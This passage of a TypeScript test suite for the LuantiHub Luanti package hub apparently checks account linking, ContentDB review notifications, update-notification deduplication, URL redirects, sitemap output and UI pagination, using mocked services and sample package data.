        { provider: 'gitlab', username: 'sakel-hub', profile_url: 'https://gitlab.com/sakel-hub', verified: true },
        { provider: 'codeberg', username: 'sakel-hub', profile_url: 'https://codeberg.org/sakel-hub', verified: true },
        { provider: 'mesehub', username: 'sakel-hub', profile_url: 'https://git.minetest.land/sakel-hub', verified: true }
      ],
      packages: []
    });
    authService.openProfileDrawer(false);
    const drawerFixture = TestBed.createComponent(ProfileDrawerComponent);
    drawerFixture.detectChanges();
    drawerFixture.componentInstance.onOpenLinkAccountModal();
    expect(authService.isProfileDrawerOpen()).toBe(false);
    expect(authService.isAuthModalOpen()).toBe(true);
    expect(authService.expandDirectSignInOnOpen()).toBe(true);
    expect(authService.selectedProvider()).toBe('contentdb');

    const authModalFixture = TestBed.createComponent(AuthModalComponent);
    authModalFixture.detectChanges();
    expect(authModalFixture.componentInstance.isDirectSignInExpanded()).toBe(true);

    // Closing AuthModal returns to ProfileDrawer on the Account tab
    authService.closeAuthModal();
    drawerFixture.detectChanges();
    expect(authService.isProfileDrawerOpen()).toBe(false === false);
    expect(drawerFixture.componentInstance.activeTab()).toBe('account');

    // 5. All packages by a creator (both ContentDB + Git like SaKeL/deathstats and pure Git like sakel-hub/x_mobs)
    //    consistently display the creator's Display Name ('SaKeL') and aggregate in getAuthorPackages
    const deathstatsPkg = (pkgService as any).normalizePackage({
      id: 'SaKeL/deathstats',
      author: 'SaKeL',
      name: 'deathstats',
      title: 'DeathStats',
      type: 'mod',
      short_desc: 'Cinematic pixel art death screen',
      source: 'git',
      sources: ['official', 'git']
    });
    const xMobsPkg = (pkgService as any).normalizePackage({
      id: 'sakel-hub/x_mobs',
      author: 'sakel-hub',
      name: 'x_mobs',
      title: 'X Mobs',
      type: 'mod',
      short_desc: 'Action-packed monsters and bosses',
      source: 'git',
      sources: ['git']
    });
    const deduplicated = (pkgService as any).deduplicateCatalog([deathstatsPkg, xMobsPkg]);
    (pkgService as any)._packages.set(deduplicated);

    expect(pkgService.getAuthorDisplayName(deduplicated[0])).toBe('SaKeL');
    expect(pkgService.getAuthorDisplayName(deduplicated[1])).toBe('SaKeL');
    expect(pkgService.getAuthorPackages('SaKeL').map(p => p.id)).toEqual(['SaKeL/deathstats', 'sakel-hub/x_mobs']);
    expect(pkgService.getAuthorPackages('sakel-hub').map(p => p.id)).toEqual(['SaKeL/deathstats', 'sakel-hub/x_mobs']);

    authService.closeProfileDrawer(false);
    (authService as any)._currentUser.set(null);

    // Even when signed out, deduplicateCatalog cross-pollinates SaKeL onto sakel-hub/x_mobs
    expect(pkgService.getAuthorDisplayName(deduplicated[1])).toBe('SaKeL');
    expect(pkgService.getAuthorPackages('SaKeL').map(p => p.id)).toEqual(['SaKeL/deathstats', 'sakel-hub/x_mobs']);
  });

  it('normalizes ContentDB /api/reviews/ items and notifies on new ContentDB reviews (e.g. Sumianvoice/age_of_mending)', async () => {
    const pkgService = TestBed.inject(PackageService);
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);

    settingsService.notifyNewReviews.set(true);

    // 1. Verify backend normalizeContentDbReviewItem handles global /api/reviews/ shape with nested `package` and naive UTC timestamp
    const naiveRecentTimestamp = new Date(Date.now() - 15 * 60 * 1000)
      .toISOString()
      .replace('Z', '');
    const normalizedBackendItem = normalizeContentDbReviewItem(
      {
        package: {
          author: 'Sumianvoice',
          name: 'age_of_mending',
          type: 'game'
        },
        user: {
          username: 'voxel_explorer',
          display_name: 'Voxel Explorer'
        },
        rating: 5,
        is_positive: true,
        title: 'Immersive survival progression',
        comment: 'Great atmospheric survival mechanics in Age of Mending!',
        created_at: naiveRecentTimestamp,
        thread: {
          id: 98765,
          url: '/threads/98765/'
        }
      },
      0,
      ''
    );

    expect(normalizedBackendItem.id).toBe('cdb_98765');
    expect(normalizedBackendItem.package_id).toBe('Sumianvoice/age_of_mending');
    expect(normalizedBackendItem.package_type).toBe('game');
    expect(normalizedBackendItem.reviewer_username).toBe('voxel_explorer');
    expect(normalizedBackendItem.reviewer_display_name).toBe('Voxel Explorer');
    expect(normalizedBackendItem.created_at).toBe(normalizeUtcIsoTimestamp(naiveRecentTimestamp));
    expect(normalizedBackendItem.created_at.endsWith('Z')).toBe(true);

    // 2. Seed baseline reviews in PwaService and verify a newly arrived ContentDB review on Age of Mending triggers a native notification
    localStorage.setItem('luantihub_seen_review_ids_v1', JSON.stringify(['cdb_11111']));
    const sendNotifSpy = vi.spyOn(pwaService, 'sendNativeNotification').mockResolvedValue(true);

    const notifiedCount = pwaService.checkAndNotifyNewReviews([
      {
        ...normalizedBackendItem,
        package_title: 'Age of Mending',
        package_thumbnail: 'https://content.luanti.org/uploads/age_of_mending.png'
      }
    ]);

    expect(notifiedCount).toBe(1);
    expect(sendNotifSpy).toHaveBeenCalledWith(
      expect.objectContaining({
        title: 'New Review · ★★★★★ Age of Mending',
        tag: 'lh-review-cdb_98765',
        category: 'new_review',
        data: {
          packageId: 'Sumianvoice/age_of_mending',
          modalSection: 'reviews',
          reviewId: 'cdb_98765'
        }
      })
    );

    // 3. Verify client-side fallback ensureRecentReviewsLoaded() unwraps paginated { items: [...] } from ContentDB /api/reviews/,
    //    enriches package metadata from catalog, and triggers checkAndNotifyNewReviews()
    const ageOfMendingPkg = (pkgService as any).normalizePackage({
      id: 'Sumianvoice/age_of_mending',
      author: 'Sumianvoice',
      name: 'age_of_mending',
      title: 'Age of Mending',
      type: 'game',
      short_desc: 'Atmospheric survival game',
      thumbnail: 'https://content.luanti.org/uploads/age_of_mending.png'
    });
    (pkgService as any)._packages.set([ageOfMendingPkg]);

    sendNotifSpy.mockClear();
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockResolvedValue(
      new Response(
        JSON.stringify({
          page: 1,
          items: [
            {
              package: {
                author: 'Sumianvoice',
                name: 'age_of_mending',
                type: 'game'
              },
              user: {
                username: 'mending_fan',
                display_name: 'Mending Fan'
              },
              rating: 5,
              is_positive: true,
              comment: 'Brand new ContentDB comment on Age of Mending!',
              created_at: naiveRecentTimestamp,
              thread: {
                id: 98766,
                url: '/threads/98766/'
              }
            }
          ]
        }),
        {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        }
      )
    );

    pkgService.ensureRecentReviewsLoaded(true);
    await (pkgService as any).recentReviewsInFlight;

    expect(sendNotifSpy).toHaveBeenCalledWith(
      expect.objectContaining({
        title: 'New Review · ★★★★★ Age of Mending',
        tag: 'lh-review-cdb_98766',
        data: {
          packageId: 'Sumianvoice/age_of_mending',
          modalSection: 'reviews',
          reviewId: 'cdb_98766'
        }
      })
    );

    fetchSpy.mockRestore();
    sendNotifSpy.mockRestore();
  });

  it('prevents stale WaySigns update notifications across foreground and Service Worker via unified notification-engine, stamp merging, 12h recency watermark, and release-date-aware syncDebouncedGitVersionStamp', async () => {
    const {
      NOTIFICATION_MAX_EVENT_AGE_MS,
      NOTIFICATION_PACKAGE_COOLDOWN_MS,
      evaluateCatalogNotificationsBatch,
      evaluatePackageStampAdvancement,
      mergeNotificationPersistenceStates,
      mergePackageVersionStamps
    } = await import('./core/utils/notification-engine');
    const { syncDebouncedGitVersionStamp } = await import('../../functions/api/lib/upstream');

    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);
    settingsService.notificationsEnabled.set(true);
    settingsService.notifyPackageUpdates.set(true);
    settingsService.notifyNewGitPackages.set(true);
    settingsService.notifyNewReviews.set(true);

    const nowMs = Date.parse('2026-11-05T15:00:00.000Z');
    const yesterdayIso = new Date(nowMs - 24 * 3600 * 1000).toISOString(); // 24h ago (> 12h window)
    const freshUpdateIso = new Date(nowMs - 10 * 60 * 1000).toISOString(); // 10m ago

    expect(NOTIFICATION_MAX_EVENT_AGE_MS).toBe(12 * 3600 * 1000);
    expect(NOTIFICATION_PACKAGE_COOLDOWN_MS).toBe(12 * 3600 * 1000);

    // 1. Regression: Backfilling missing fields ("" -> value) or reverting from hydrated to unhydrated must NOT notify
    // Stamp format is `rel|upd|sha`
    expect(mergePackageVersionStamps('35412||', `35412|${yesterdayIso}|a1b2c3d4e5f60718`)).toBe(
      `35412|${yesterdayIso}|a1b2c3d4e5f60718`
    );
    expect(mergePackageVersionStamps(`35412|${yesterdayIso}|a1b2c3d4e5f60718`, '35412||')).toBe(
      `35412|${yesterdayIso}|a1b2c3d4e5f60718`
    );

    // Case A: Detail hydration backfills latest_commit_sha & yesterday's updated_at (both prevUpd and prevSha were "")
    const backfillEval = evaluatePackageStampAdvancement(
      '35412||',
      `35412|${yesterdayIso}|a1b2c3d4e5f60718`,
      { nowMs, baselineSeededAt: nowMs - 2 * 3600 * 1000 }
    );
    expect(backfillEval.genuinelyAdvanced).toBe(false);
    expect(backfillEval.mergedStamp).toBe(`35412|${yesterdayIso}|a1b2c3d4e5f60718`);

    // Case B: Subsequent catalog poll returns unhydrated row without latest_commit_sha -> stamp is preserved, 0 notifications
    const unhydratedEval = evaluatePackageStampAdvancement(
      backfillEval.mergedStamp,
      '35412||',
      { nowMs, baselineSeededAt: nowMs - 2 * 3600 * 1000 }
    );
    expect(unhydratedEval.genuinelyAdvanced).toBe(false);
    expect(unhydratedEval.mergedStamp).toBe(`35412|${yesterdayIso}|a1b2c3d4e5f60718`);

    // Case B2: SHA flip-flop (branch head vs tag SHA) with the exact same updated_at and same release_id must NOT be treated as a new release
    const shaFlipFlopSameTime = evaluatePackageStampAdvancement(
      `35412|${freshUpdateIso}|a1b2c3d4e5f60718`,
      `35412|${freshUpdateIso}|b2c3d4e5f6071829`,
      { nowMs, baselineSeededAt: nowMs - 2 * 3600 * 1000 }
    );
    expect(shaFlipFlopSameTime.genuinelyAdvanced).toBe(false);

    // Case C: Even if SHA and release_id advanced, an event from yesterday (24h ago > 12h max age) is rejected as not recent
    const staleReleaseEval = evaluatePackageStampAdvancement(
      backfillEval.mergedStamp,
      `35413|${yesterdayIso}|b2c3d4e5f6071829`,
      { nowMs, baselineSeededAt: nowMs - 36 * 3600 * 1000 }
    );
    expect(staleReleaseEval.genuinelyAdvanced).toBe(true);
    expect(staleReleaseEval.isRecent).toBe(false);
    expect(staleReleaseEval.mergedStamp).toBe(`35413|${yesterdayIso}|b2c3d4e5f6071829`);

    const staleSwBatch = evaluateCatalogNotificationsBatch(
      {
        packages: [
          {
            id: 'SaKeL/waysigns',
            author: 'SaKeL',
            name: 'waysigns',
            title: 'WaySigns',
            type: 'mod',
            short_desc: 'Dynamic in-world HUD signboards, waypoints, and inscription marker with zero entity lag.',
            release_id: 35413,
            latest_commit_sha: 'b2c3d4e5f6071829',
            updated_at: yesterdayIso
          }
        ]
      },
      {
        prefs: {
          notificationsEnabled: true,
          notifyPackageUpdates: true,
          notifyNewGitPackages: true,
          notifyNewReviews: true
        },
        baselineSeededAt: nowMs - 36 * 3600 * 1000,
        knownPackageVersions: { 'sakel/waysigns': backfillEval.mergedStamp },
        packageUpdateCooldowns: {}
      },
      nowMs
    );
    expect(staleSwBatch.notifications.length).toBe(0);
    expect(staleSwBatch.stateUpdates.knownPackageVersions?.['sakel/waysigns']).toBe(
      `35413|${yesterdayIso}|b2c3d4e5f6071829`
    );

    // 2. DRY Foreground (PwaService) & Background (Service Worker evaluateCatalogNotificationsBatch) Parity
    const freshWaySignsPkg = {
      id: 'SaKeL/waysigns',
      author: 'SaKeL',
      name: 'waysigns',
      title: 'WaySigns',
      type: 'mod' as const,
      short_desc: 'Dynamic in-world HUD signboards, waypoints, and inscription marker with zero entity lag.',
      thumbnail: 'https://cdn.content.luanti.org/uploads/waysigns.png',
      release_id: 35500,
      latest_commit_sha: 'c3d4e5f60718293a',
      updated_at: freshUpdateIso
    };

    const swState = {
      prefs: {
        notificationsEnabled: true,
        notifyPackageUpdates: true,
        notifyNewGitPackages: true,
        notifyNewReviews: true
      },
      baselineSeededAt: nowMs - 2 * 3600 * 1000,
      lastBootFetchAt: nowMs - 20 * 60 * 1000,
      knownGitPackages: ['sakel/waysigns'],
      seenReviewIds: ['cdb_1'],
      seenTags: [],
      knownPackageVersions: { 'sakel/waysigns': `35413|${yesterdayIso}|b2c3d4e5f6071829` },
      packageUpdateCooldowns: {}
    };

    const swBatchResult = evaluateCatalogNotificationsBatch(
      { packages: [freshWaySignsPkg], recentReviews: [] },
      swState,
      nowMs
    );
    expect(swBatchResult.notifications.length).toBe(1);
    const swNotif = swBatchResult.notifications[0];
    expect(swNotif.title).toBe('Package Updated · [MOD] WaySigns');
    expect(swNotif.body).toContain('(c3d4e5f)');
    expect(swNotif.body).toContain('by SaKeL');
    expect(swNotif.tag).toBe(`lh-pkg-update-sakel/waysigns-35500|${freshUpdateIso}|c3d4e5f60718293a`);
    expect(swNotif.timestamp).toBe(Date.parse(freshUpdateIso));

    // Verify 12h cooldown prevents duplicate notification on immediate re-evaluation
    const swRepeatResult = evaluateCatalogNotificationsBatch(
      {
        packages: [
          {
            ...freshWaySignsPkg,
            release_id: 35501,
            latest_commit_sha: 'd4e5f60718293a4b',
            updated_at: new Date(nowMs - 5 * 60 * 1000).toISOString()
          }
        ],
        recentReviews: []
      },
      { ...swState, ...swBatchResult.stateUpdates },
      nowMs
    );
    expect(swRepeatResult.notifications.length).toBe(0);

    // Verify PwaService produces the exact same notification payload
    const realRecentIso = new Date(Date.now() - 60_000).toISOString();
    const realWaySignsPkg = {
      ...freshWaySignsPkg,
      updated_at: realRecentIso
    };
    const expectedSwForReal = evaluateCatalogNotificationsBatch(
      { packages: [realWaySignsPkg], recentReviews: [] },
      {
        ...swState,
        baselineSeededAt: Date.now() - 2 * 3600 * 1000
      },
      Date.now()
    ).notifications[0];

    localStorage.setItem(
      'lh_notif_baseline_seeded_at_v1',
      String(Date.now() - 2 * 3600 * 1000)
    );
    localStorage.setItem(
      'lh_known_package_versions_v1',
      JSON.stringify({
        'sakel/waysigns': `35413|${yesterdayIso}|b2c3d4e5f6071829`
      })
    );
    localStorage.removeItem('lh_package_update_cooldown_v1');

    const sentForegroundPayloads: any[] = [];
    const origSend = pwaService.sendNativeNotification.bind(pwaService);
    pwaService.sendNativeNotification = async (payload: any) => {
      sentForegroundPayloads.push(payload);
      return true;
    };
    try {
      const fgCount = await pwaService.checkAndNotifyUpdatedPackages([realWaySignsPkg], {
        isBaselineSeedAllowed: false
      });
      expect(fgCount).toBe(1);
      expect(sentForegroundPayloads[0].title).toBe(expectedSwForReal.title);
      expect(sentForegroundPayloads[0].body).toBe(expectedSwForReal.body);
      expect(sentForegroundPayloads[0].tag).toBe(expectedSwForReal.tag);
      expect(sentForegroundPayloads[0].timestamp).toBe(expectedSwForReal.timestamp);
    } finally {
      pwaService.sendNativeNotification = origSend;
      localStorage.removeItem('lh_known_package_versions_v1');
      localStorage.removeItem('lh_notif_baseline_seeded_at_v1');
      localStorage.removeItem('lh_package_update_cooldown_v1');
    }

    // 3. Startup IndexedDB State Merge preserves Service Worker seenTags, cooldowns, and lastBootFetchAt
    const mergedState = mergeNotificationPersistenceStates(
      {
        baselineSeededAt: nowMs - 3600 * 1000,
        lastBootFetchAt: 0,
        knownGitPackages: ['sakel/waysigns'],
        seenReviewIds: [],
        seenTags: ['lh-fg-tag-1'],
        knownPackageVersions: { 'sakel/waysigns': '35412||' },
        packageUpdateCooldowns: {}
      },
      {
        baselineSeededAt: nowMs - 7200 * 1000,
        lastBootFetchAt: nowMs - 300 * 1000,
        knownGitPackages: ['sakel/pixie'],
        seenReviewIds: ['cdb_99'],
        seenTags: ['lh-pkg-update-sakel/waysigns-35500'],
        knownPackageVersions: { 'sakel/waysigns': `35500|${freshUpdateIso}|c3d4e5f60718293a` },
        packageUpdateCooldowns: { 'sakel/waysigns': nowMs - 60_000 }
      }
    );
    expect(mergedState.baselineSeededAt).toBe(nowMs - 7200 * 1000);
    expect(mergedState.lastBootFetchAt).toBe(nowMs - 300 * 1000);
    expect(mergedState.seenTags).toContain('lh-pkg-update-sakel/waysigns-35500');
    expect(mergedState.seenTags).toContain('lh-fg-tag-1');
    expect(mergedState.knownPackageVersions?.['sakel/waysigns']).toBe(
      `35500|${freshUpdateIso}|c3d4e5f60718293a`
    );
    expect(mergedState.packageUpdateCooldowns?.['sakel/waysigns']).toBe(nowMs - 60_000);

    // 4. Server-side syncDebouncedGitVersionStamp preserves updated_at when observed release date is not newer
    const executedQueries: Array<{ sql: string; args: any[] }> = [];
    const mockDb = {
      prepare(sql: string) {
        return {
          bind(...args: any[]) {
            return {
              async run() {
                executedQueries.push({ sql, args });
                return { success: true };
              },
              async all() {
                return { results: [] };
              }
            };
          },
          async all() {
            return { results: [] };
          },
          async run() {
            return { success: true };
          }
        };
      }
    };

    const d1WaySigns = {
      id: 'SaKeL/waysigns',
      latest_commit_sha: '1111111111111111',
      updated_at: '2026-11-04T12:00:00.000Z'
    };

    // Syncing a tag whose released_at is equal to or older than d1Pkg.updated_at updates latest_commit_sha WITHOUT bumping updated_at
    const didBumpStaleTag = await syncDebouncedGitVersionStamp(
      mockDb,
      d1WaySigns,
      '2222222222222222',
      true,
      '2026-11-04T10:00:00.000Z'
    );
    expect(didBumpStaleTag).toBe(false);
    expect(d1WaySigns.latest_commit_sha).toBe('2222222222222222');
    expect(d1WaySigns.updated_at).toBe('2026-11-04T12:00:00.000Z');
    expect(executedQueries.some(q => q.sql.includes('updated_at = ?'))).toBe(false);

    // Syncing a tag with a newer released_at sets updated_at to that release timestamp (not Date.now())
    const didBumpNewTag = await syncDebouncedGitVersionStamp(
      mockDb,
      d1WaySigns,
      '3333333333333333',
      true,
      '2026-11-05T14:30:00.000Z'
    );
    expect(didBumpNewTag).toBe(true);
    expect(d1WaySigns.latest_commit_sha).toBe('3333333333333333');
    expect(d1WaySigns.updated_at).toBe('2026-11-05T14:30:00.000Z');

    // 5. Canonicalize www.luantihub.org -> https://luantihub.org at the Edge Middleware so Service Worker & notification state never split across origins
    const wwwRedirectRes = await edgeMiddleware({
      request: new Request('https://www.luantihub.org/packages/SaKeL/waysigns?tab=releases', {
        method: 'GET'
      }),
      next: async () => new Response('OK', { status: 200 }),
      env: {}
    });
    expect(wwwRedirectRes.status).toBe(301);
    expect(wwwRedirectRes.headers.get('location')).toBe(
      'https://luantihub.org/packages/SaKeL/waysigns?tab=releases'
    );

    const wwwRootRedirectRes = await edgeMiddleware({
      request: new Request('https://www.luantihub.org/', {
        method: 'GET'
      }),
      next: async () => new Response('OK', { status: 200 }),
      env: {}
    });
    expect(wwwRootRedirectRes.status).toBe(301);
    expect(wwwRootRedirectRes.headers.get('location')).toBe('https://luantihub.org/');

    const wwwPrivacyRedirectRes = await edgeMiddleware({
      request: new Request('https://www.luantihub.org/privacy?lang=en', {
        method: 'GET'
      }),
      next: async () => new Response('OK', { status: 200 }),
      env: {}
    });
    expect(wwwPrivacyRedirectRes.status).toBe(301);
    expect(wwwPrivacyRedirectRes.headers.get('location')).toBe('https://luantihub.org/legal?lang=en');

    const blogSeoRes = await edgeMiddleware({
      request: new Request('https://luantihub.org/blog', {
        method: 'GET'
      }),
      next: async () =>
        new Response(
          '<!doctype html><html><head><title>Default</title><meta name="description" content="Default" /><link rel="canonical" id="canonical-link" href="https://luantihub.org/" /></head><body><h1>Default</h1></body></html>',
          { status: 200, headers: { 'Content-Type': 'text/html; charset=utf-8' } }
        ),
      env: {}
    });
    expect(blogSeoRes.status).toBe(200);
    const blogHtml = await blogSeoRes.text();
    expect(blogHtml).toContain('<link rel="canonical" id="canonical-link" href="https://luantihub.org/blog" />');
    expect(blogHtml).toContain('Official Luanti Blog');

    const sitemapMod = await import('../../functions/sitemap.xml');
    const sitemapGetRes = await sitemapMod.onRequestGet({
      request: new Request('https://luantihub.org/sitemap.xml', { method: 'GET' }),
      env: {}
    });
    expect(sitemapGetRes.status).toBe(200);
    const sitemapXml = await sitemapGetRes.text();
    expect(sitemapXml).toContain('<loc>https://luantihub.org/blog</loc>');
    expect(sitemapXml).toContain('hreflang="x-default" href="https://luantihub.org/"');

    const sitemapHeadRes = await sitemapMod.onRequestHead({
      request: new Request('https://luantihub.org/sitemap.xml', { method: 'HEAD' }),
      env: {}
    });
    expect(sitemapHeadRes.status).toBe(200);
    expect(sitemapHeadRes.headers.get('content-type')).toContain('application/xml');
    expect(await sitemapHeadRes.text()).toBe('');
  });

  it('should render HeroBillboardComponent artwork-derived ambient backlight glow using LCP-safe 32x18 dual-canvas crossfade with zero extra img elements', () => {
    const heroFixture = TestBed.createComponent(HeroBillboardComponent);
    const heroComp = heroFixture.componentInstance;
    heroFixture.detectChanges();

    const heroEl = heroFixture.nativeElement as HTMLElement;
    const glowContainer = heroEl.querySelector('[data-testid="hero-ambient-glow"]') as HTMLElement;
    expect(glowContainer).toBeTruthy();
    expect(glowContainer.getAttribute('style') || '').not.toContain('mask-image');
    expect(glowContainer.getAttribute('style') || '').toContain('linear-gradient');
    expect(glowContainer.className).toContain('block');
    expect(glowContainer.className).not.toContain('hidden');
    expect(glowContainer.className).toContain('rounded-2xl');
    expect(glowContainer.className).toContain('sm:rounded-3xl');
    expect(glowContainer.className).toContain('blur-[22px]');
    expect(glowContainer.className).toContain('sm:blur-[36px]');
    expect(glowContainer.className).toContain('lg:blur-[48px]');
    expect(glowContainer.className).toContain('xl:blur-[60px]');

    // 1. Ensure ZERO <img> elements exist inside the oversized ambient glow container so Chromium/Lighthouse LCP never picks the glow layer
    expect(glowContainer.querySelectorAll('img').length).toBe(0);
    // Ensure no hardcoded luanti-5-18-0 backdrop image exists in HeroBillboardComponent
    expect(heroEl.querySelectorAll('img[src*="luanti-5-18-0"]').length).toBe(0);

    // 2. Ensure two full-size 32x18 <canvas> buffers are mounted for smooth crossfading with matching rectangular corners
    const canvases = glowContainer.querySelectorAll('canvas');
    expect(canvases.length).toBe(2);
    expect(canvases[0].getAttribute('width')).toBe('32');
    expect(canvases[0].getAttribute('height')).toBe('18');
    expect(canvases[0].className).toContain('w-full');
    expect(canvases[0].className).toContain('h-full');
    expect(canvases[0].className).toContain('rounded-2xl');
    expect(canvases[0].className).toContain('sm:rounded-3xl');
    expect(canvases[1].getAttribute('width')).toBe('32');
    expect(canvases[1].getAttribute('height')).toBe('18');
    expect(canvases[1].className).toContain('w-full');
    expect(canvases[1].className).toContain('h-full');
    expect(canvases[1].className).toContain('rounded-2xl');
    expect(canvases[1].className).toContain('sm:rounded-3xl');

    // 3. Verify paintGlowFromImage draws into the 32x18 canvas and crossfades activeGlowBuffer between 0 and 1
    const drawnImages: Array<{ src: string; w: number; h: number }> = [];
    const mockCtx = {
      clearRect: vi.fn(),
      drawImage: vi.fn((img: HTMLImageElement, _x: number, _y: number, w: number, h: number) => {
        drawnImages.push({ src: img.currentSrc || img.src, w, h });
      })
    } as unknown as CanvasRenderingContext2D;

    const getContextSpy = vi
      .spyOn(HTMLCanvasElement.prototype, 'getContext')
      .mockReturnValue(mockCtx as any);

    try {
      const fakeImg1 = {
        complete: true,
        naturalWidth: 1280,
        currentSrc: 'https://luantihub.org/banners/slide-1.png',
        src: 'https://luantihub.org/banners/slide-1.png'
      } as HTMLImageElement;

      expect(heroComp.paintGlowFromImage(fakeImg1)).toBe(true);
      expect(heroComp.activeGlowBuffer()).toBe(0);
      expect(drawnImages.length).toBe(1);
      expect(drawnImages[0]).toEqual({
        src: 'https://luantihub.org/banners/slide-1.png',
        w: 32,
        h: 18
      });

      // Painting the same image again is a no-op
      expect(heroComp.paintGlowFromImage(fakeImg1)).toBe(false);
      expect(drawnImages.length).toBe(1);

      // Painting the next slide's image swaps to buffer 1 and crossfades opacity
      const fakeImg2 = {
        complete: true,
        naturalWidth: 1280,
        currentSrc: 'https://luantihub.org/banners/slide-2.png',
        src: 'https://luantihub.org/banners/slide-2.png'
      } as HTMLImageElement;

      expect(heroComp.paintGlowFromImage(fakeImg2)).toBe(true);
      expect(heroComp.activeGlowBuffer()).toBe(1);
      expect(drawnImages.length).toBe(2);
      heroFixture.detectChanges();

      expect(canvases[0].className).toContain('opacity-0');
      expect(canvases[1].className).toContain('opacity-60');
    } finally {
      getContextSpy.mockRestore();
    }
  });

  it('should paginate, filter, and sort My Packages (8 per page) in ProfileDrawerComponent using the shared DrawerPaginationComponent', () => {
    const authService = TestBed.inject(AuthService);
    const pkgService = TestBed.inject(PackageService);

    const twentyPackages = Array.from({ length: 20 }, (_, i) =>
      (pkgService as any).normalizePackage({
        id: `SaKeL/mod_${i + 1}`,
        author: 'SaKeL',
        name: `mod_${i + 1}`,
        title: `Mod ${i + 1}`,
        type: i === 0 ? 'game' : 'mod',
        short_desc: `Description for mod ${i + 1}`,
        downloads: (20 - i) * 100,
        score: 4.8,
        source: i % 2 === 0 ? 'git' : 'official',
        sources: i % 2 === 0 ? ['git', 'official'] : ['official']
      })
    );

    (pkgService as any)._packages.set(twentyPackages);
    (authService as any)._currentUser.set({
      id: 'user-sakel',
      username: 'sakel-hub',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      role: 'admin',
      identities: [
        { provider: 'github', username: 'sakel-hub', verified: true },
        { provider: 'contentdb', username: 'SaKeL', verified: true }
      ],
      packages: []
    });
    (authService as any)._isProfileDrawerOpen.set(true);

    const fixture = TestBed.createComponent(ProfileDrawerComponent);
    const comp = fixture.componentInstance;
    fixture.detectChanges();

    expect(comp.userPackages().length).toBe(20);
    expect(comp.packagesTotalPages()).toBe(3);
    expect(comp.pagedUserPackages().length).toBe(8);
    expect(comp.pagedUserPackages()[0].title).toBe('Mod 1');

    const el = fixture.nativeElement as HTMLElement;
    const paginationBar = el.querySelector('[data-testid="drawer-pagination-bar"]');
    expect(paginationBar).toBeTruthy();
    expect(paginationBar?.textContent).toContain('Page 1 / 3 (20)');

    // Advance to Page 3 -> 4 remaining packages
    comp.setPackagesPage(3);
    fixture.detectChanges();
    expect(comp.packagesCurrentPage()).toBe(3);
    expect(comp.pagedUserPackages().length).toBe(4);
    expect(paginationBar?.textContent).toContain('Page 3 / 3 (20)');

    // Filter by 'git' category -> 10 git packages (2 pages) and resets page to 1
    comp.selectPackageCategory('git');
    fixture.detectChanges();
    expect(comp.filteredUserPackages().length).toBe(10);
    expect(comp.packagesTotalPages()).toBe(2);
    expect(comp.packagesCurrentPage()).toBe(1);
    expect(comp.pagedUserPackages().length).toBe(8);
  });

  it('should compute LuantiHub-first velocity/frecency metrics, infer and merge game support (preserving supports: false), resolve multi-language translations, and find reverse dependencies', async () => {
    const pkgService = TestBed.inject(PackageService);
    const settingsService = TestBed.inject(SettingsService);
    const i18n = TestBed.inject(TranslationService);

    // 1. LuantiHub-First Frecency & Velocity Metrics
    const frecency = computeLuantiHubFrecencyMetrics({
      luantihubDownloads: 400,
      dailyDownloads: 10,
      weeklyDownloads: 50,
      favoritesCount: 12,
      score: 4.8,
      reviewThreadCounts: { positive: 5, neutral: 1, negative: 0 },
      contentdbScoreDownloads: 120,
      contentdbScoreReviews: 45
    });
    expect(frecency.luantihub_score_downloads).toBeGreaterThan(200);
    expect(frecency.contentdb_score_downloads).toBe(120);
    expect(frecency.score_downloads).toBe(frecency.luantihub_score_downloads + 120);
    expect(frecency.score_reviews).toBeGreaterThan(45);

    // 2. Game Support Inference from Git mod.conf dependencies + Merge preserving supports: false
    const inferredGames = inferGameSupportFromDependencies(['default', 'mcl_core', 'nc_api_all']);
    expect(inferredGames.map(g => g.game.name)).toEqual(['minetest_game', 'mineclone2', 'mineclonia', 'nodecore']);
    expect(inferredGames.every(g => g.supports === true)).toBe(true);

    const mergedGames = mergeLuantiHubAndContentDbGameSupport(
      [
        {
          confidence: 11,
          supports: false,
          game: { id: 'Wuzzy/mineclone2', author: 'Wuzzy', name: 'mineclone2', title: 'VoxeLibre' }
        }
      ],
      [
        {
          confidence: 10,
          supports: true,
          game: { id: 'Wuzzy/mineclone2', author: 'Wuzzy', name: 'mineclone2', title: 'VoxeLibre' }
        },
        {
          confidence: 10,
          supports: true,
          game: { id: 'Minetest/minetest_game', author: 'Minetest', name: 'minetest_game', title: 'Minetest Game' }
        }
      ],
      ['default']
    );
    const voxeLibreEntry = mergedGames.find(g => g.game.name === 'mineclone2');
    expect(voxeLibreEntry?.supports).toBe(false); // LuantiHub author override wins over ContentDB
    const mtgEntry = mergedGames.find(g => g.game.name === 'minetest_game');
    expect(mtgEntry?.supports).toBe(true);

    // 3. Multi-Language Package Metadata Resolution (LuantiHub D1 translations first)
    const localizedPkg = (pkgService as any).normalizePackage({
      id: 'SaKeL/everness',
      author: 'SaKeL',
      name: 'everness',
      title: 'Everness',
      type: 'mod',
      short_desc: 'Explore new biomes and dimensions.',
      desc: 'Full English description.',
      translations: {
        de: {
          title: 'Everness (Deutsch)',
          short_desc: 'Entdecke neue Biome und Dimensionen.'
        },
        sk: {
          title: 'Everness (SK)',
          short_desc: 'Preskúmajte nové biómy a dimenzie.'
        }
      }
    });
    expect(resolveLocalizedPackageText(localizedPkg, 'de').title).toBe('Everness (Deutsch)');
    i18n.setLocale('sk');
    expect(pkgService.getLocalizedPackageText(localizedPkg).short_desc).toBe('Preskúmajte nové biómy a dimenzie.');
    i18n.setLocale('en');
    expect(pkgService.getLocalizedPackageText(localizedPkg).title).toBe('Everness');

    // 4. Screenshot Metadata Captions (`parseScreenshotMetaArray`)
    const parsedMeta = parseScreenshotMetaArray([
      { url: 'https://content.luanti.org/uploads/shot1.png', title: 'Crystal Forest Biome', width: 1920, height: 1080 }
    ]);
    expect(parsedMeta.length).toBe(1);
    expect(parsedMeta[0].title).toBe('Crystal Forest Biome');

    // 5. Reverse Dependencies ("Used By / Ecosystem Add-ons") & Favorites Recommendations
    const baseLib = (pkgService as any).normalizePackage({
      id: 'mt-mods/mesecons',
      author: 'mt-mods',
      name: 'mesecons',
      title: 'Mesecons',
      type: 'mod',
      short_desc: 'Digital circuitry and logic gates',
